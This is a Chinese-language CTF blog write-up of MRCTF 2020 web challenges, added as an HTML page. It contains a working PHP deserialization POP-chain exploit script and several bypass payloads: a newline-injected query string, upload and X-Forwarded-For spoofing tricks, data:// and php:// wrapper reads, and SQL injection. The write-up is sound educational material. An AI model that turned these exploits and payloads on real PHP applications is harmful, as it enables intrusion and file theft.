@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>MRCTF复盘题解</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/&title=MRCTF复盘题解" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/&title=MRCTF复盘题解" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/&text=MRCTF复盘题解" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MRCTF复盘题解&body=Check out this article: http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-01-Ez-bypass"><span class="toc-number">1.1.</span> <span class="toc-text">0x 01 Ez_bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-02-你传你🐎呢"><span class="toc-number">1.2.</span> <span class="toc-text">0x 02 你传你🐎呢</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-03-PYWebsite"><span class="toc-number">1.3.</span> <span class="toc-text">0x 03 PYWebsite</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-04-Ezpop"><span class="toc-number">1.4.</span> <span class="toc-text">0x 04 Ezpop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-05-套娃"><span class="toc-number">1.5.</span> <span class="toc-text">0x 05 套娃</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-06-Ezaudit"><span class="toc-number">1.6.</span> <span class="toc-text">0x 06 Ezaudit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-07"><span class="toc-number">1.7.</span> <span class="toc-text">0x 07</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        MRCTF复盘题解
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-31T00:04:00.000Z" itemprop="datePublished">2020-03-31</time>
+        
+        (Updated: <time datetime="2020-04-01T15:19:58.566Z" itemprop="dateModified">2020-04-01</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/ctfwp/">ctfwp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/MRCTF/" rel="tag">MRCTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-Ez-bypass"><a href="#0x-01-Ez-bypass" class="headerlink" title="0x 01 Ez_bypass"></a>0x 01 Ez_bypass</h4><p>第一层数组绕过，第二层弱类型比较绕过</p>
+<h4 id="0x-02-你传你🐎呢"><a href="#0x-02-你传你🐎呢" class="headerlink" title="0x 02 你传你🐎呢"></a>0x 02 你传你🐎呢</h4><p>上传.htaccess绕过</p>
+<h4 id="0x-03-PYWebsite"><a href="#0x-03-PYWebsite" class="headerlink" title="0x 03 PYWebsite"></a>0x 03 PYWebsite</h4><p>XFF伪造127.0.0.1得到flag</p>
+<h4 id="0x-04-Ezpop"><a href="#0x-04-Ezpop" class="headerlink" title="0x 04 Ezpop"></a>0x 04 Ezpop</h4><ol>
+<li><code>__wakeup()</code>方法通过<code>preg_match()</code>将<code>$this-&gt;source</code>做字符串比较，如果<code>$this-&gt;source</code>是<code>Show</code>类，就调用了<code>__toString()</code>方法；</li>
+<li><code>__toString()</code>访问了<code>str</code>的<code>source</code>属性，<code>str</code>是<code>Test</code>类，不存在<code>source</code>属性，就调用了<code>Test</code>类的<code>__get()</code>魔术方法；</li>
+<li><code>__get()</code>方法将<code>p</code>作为函数使用，<code>p</code>实例化为<code>Modify</code>类，就调用了<code>Modifier</code>的<code>__invoke()</code>方法；</li>
+<li><code>__invoke()</code>调用了<code>append()</code>方法，包含<code>$value</code>，若将<code>$value</code>为伪协议，则可读flag.php源码</li>
+</ol>
+<p>exp如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">        $this-&gt;source &#x3D; $file;</span><br><span class="line">        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return &quot;aaa&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p &#x3D; new Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o &#x3D; new Show(&#39;aaa&#39;);</span><br><span class="line">$o-&gt;str&#x3D; new Test();</span><br><span class="line">$lxj &#x3D; new Show($o);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($lxj));</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x-05-套娃"><a href="#0x-05-套娃" class="headerlink" title="0x 05 套娃"></a>0x 05 套娃</h4><ul>
+<li>第一关</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &#39;_&#39;) !&#x3D;&#x3D; 0 || substr_count($query, &#39;%5f&#39;) !&#x3D; 0 )&#123;</span><br><span class="line">    die(&#39;Y0u are So cutE!&#39;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&#39;b_u_p_t&#39;] !&#x3D;&#x3D; &#39;23333&#39; &amp;&amp; preg_match(&#39;&#x2F;^23333$&#x2F;&#39;, $_GET[&#39;b_u_p_t&#39;]))&#123;</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>第一层匹配了<code>_</code>符号和它的url编码值，有如下方法绕过：</p>
+<ol>
+<li>%5F</li>
+<li>b.u.p.t（点代替_）</li>
+<li>b u p t（空格代替_）</li>
+</ol>
+<p>第二层换行污染绕过，最终payload：?b.u.p.t=23333%0a</p>
+<ul>
+<li>第二关</li>
+</ul>
+<p>伪造本地访问得到jsfuck提示<code>post me Merak</code>，post一个Merak参数得到源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include &#39;takeip.php&#39;;</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;.&#39;); </span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;Merak&#39;]))&#123; </span><br><span class="line">    highlight_file(__FILE__); </span><br><span class="line">    die(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function change($v)&#123; </span><br><span class="line">    $v &#x3D; base64_decode($v); </span><br><span class="line">    $re &#x3D; &#39;&#39;; </span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .&#x3D; chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">echo &#39;Local access only!&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">if($ip!&#x3D;&#39;127.0.0.1&#39;)</span><br><span class="line">echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;</span><br><span class="line">if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#39;file&#39;])); &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>file_get_contents()</code>用<code>data://</code>或者<code>php://input</code>伪协议绕过,根据加密脚本可以编写出dechange函数，得到<code>ZmpdYSZmXGI=</code>，最终发包得到flag</p>
+<p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200401230121454.png" alt></p>
+<h4 id="0x-06-Ezaudit"><a href="#0x-06-Ezaudit" class="headerlink" title="0x 06 Ezaudit"></a>0x 06 Ezaudit</h4><p><a href="http://www.zip源代码泄露，题目类似于GWCTF枯燥的抽奖，根据原题的payload还原出种子，然后手工推算出私钥，最后SQL注入得到flag" target="_blank" rel="noopener">www.zip源代码泄露，题目类似于GWCTF枯燥的抽奖，根据原题的payload还原出种子，然后手工推算出私钥，最后SQL注入得到flag</a></p>
+<h4 id="0x-07"><a href="#0x-07" class="headerlink" title="0x 07"></a>0x 07</h4>
+  </div>
+</article>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-01-Ez-bypass"><span class="toc-number">1.1.</span> <span class="toc-text">0x 01 Ez_bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-02-你传你🐎呢"><span class="toc-number">1.2.</span> <span class="toc-text">0x 02 你传你🐎呢</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-03-PYWebsite"><span class="toc-number">1.3.</span> <span class="toc-text">0x 03 PYWebsite</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-04-Ezpop"><span class="toc-number">1.4.</span> <span class="toc-text">0x 04 Ezpop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-05-套娃"><span class="toc-number">1.5.</span> <span class="toc-text">0x 05 套娃</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-06-Ezaudit"><span class="toc-number">1.6.</span> <span class="toc-text">0x 06 Ezaudit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-07"><span class="toc-number">1.7.</span> <span class="toc-text">0x 07</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/&title=MRCTF复盘题解" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/&title=MRCTF复盘题解" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/&text=MRCTF复盘题解" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MRCTF复盘题解&body=Check out this article: http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 John Doe 
+    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
+    
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  
+  <div class="footer-custom">
+    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
+     
+      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
+        <img class="img-response" src="/images/upyun.png" alt="cdn image">
+      </a>
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+</body>
+</html>
